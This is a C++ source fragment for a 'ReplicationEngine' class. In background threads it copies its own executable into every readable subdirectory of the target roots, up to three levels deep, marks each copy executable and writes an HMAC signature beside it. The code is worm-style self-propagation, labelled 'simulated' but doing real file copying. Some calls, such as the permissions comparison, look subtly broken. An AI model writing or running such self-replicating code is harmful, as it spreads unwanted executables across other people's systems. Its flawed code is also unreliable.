class ReplicationEngine {
private:
    std::mutex mtx;
    std::atomic<int> active_threads{0};
    std::vector<std::string> target_roots;
    std::string self_path;
    std::string replica_prefix{"__simulated_replica_"};
    int max_replica_depth{3};

public:
    ReplicationEngine(const std::vector<std::string>& roots, const std::string& path)
        : target_roots(roots), self_path(path) {
        if (target_roots.empty()) {
            target_roots = { "./replication_pool" };
        }
        fs::create_directories("./replication_pool");
    }

    bool self_copy_to(const std::string& dest_dir, int depth = 0) {
        if (depth >= max_replica_depth) return false;

        std::lock_guard<std::mutex> lock(mtx);
        std::string replica_name = replica_prefix + std::to_string(time(nullptr) % 10000) + ".sim";
        std::string replica_path = dest_dir + "/" + replica_name;

        std::ifstream src(self_path, std::ios::binary);
        if (!src.is_open()) return false;

        std::ofstream dst(replica_path, std::ios::binary);
        if (!dst.is_open()) {
            src.close();
            return false;
        }

        dst << src.rdbuf();
        src.close();
        dst.close();

        chmod(replica_path.c_str(), 0755);

        std::string content;
        std::ifstream f(replica_path);
        content.assign((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
        f.close();

        std::string sig = CryptoService::generate_hmac(content);
        std::ofstream sigfile(replica_path + ".sig");
        sigfile << sig;
        sigfile.close();

        std::cout << "[REPLICA_CREATED] " << replica_path << " (Depth: " << depth << ")" << std::endl;
        return true;
    }

    void launch_replication_cycle() {
        for (const auto& root : target_roots) {
            if (!fs::exists(root)) continue;

            std::thread([this, root]() {
                active_threads++;
                int depth = 0;
                std::vector<std::string> queue = { root };

                while (!queue.empty() && depth < max_replica_depth) {
                    std::vector<std::string> next_queue;
                    for (const auto& dir : queue) {
                        try {
                            for (const auto& entry : fs::directory_iterator(dir)) {
                                if (entry.is_directory() && fs::permissions(entry) >= fs::perms::owner_read) {
                                    next_queue.push_back(entry.path().string());
                                }
                            }
                            self_copy_to(dir, depth);
                        } catch (...) { continue; }
                    }
                    queue = next_queue;
                    depth++;
                    std::this_thread::sleep_for(std::chrono::milliseconds(150));
                }
                active_threads--;
            }).detach();
        }
    }
};

